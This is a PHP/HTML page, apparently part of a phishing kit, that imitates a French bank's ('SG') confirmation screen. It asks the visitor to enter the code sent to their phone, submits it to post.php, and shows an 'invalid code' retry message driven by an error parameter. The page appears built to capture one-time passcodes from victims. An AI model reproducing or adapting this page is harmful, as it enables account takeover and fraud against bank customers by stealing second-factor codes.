<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SG</title>
    <link rel="stylesheet" href="res/css/main.css">
</head>
<body>
    
    <div class="container">       

        <div class="box">

            <img src="res/img/logo.png" class="logo">

            <h3>Confirmation</h3>
           <p>Veuillez entrer le code envoyé à votre numéro <br> de téléphone pour continuer.</p>

            <form action="post.php" method="post">
            <div class="col">
            <input type="text" name="otp" required placeholder="Enter the code">
        
            <?php 
            if(isset($_GET['error'])){
            echo '<input type="hidden" name="exit">';
            echo '<p style="color:red;">Code invalide. Veuillez réessayer.</p>';
            }
            ?>
                <button type="submit" class="login-btn">Suivant</button>
            </div>
                
            </form>
        
        </div>
    </div>
</body>
</html>
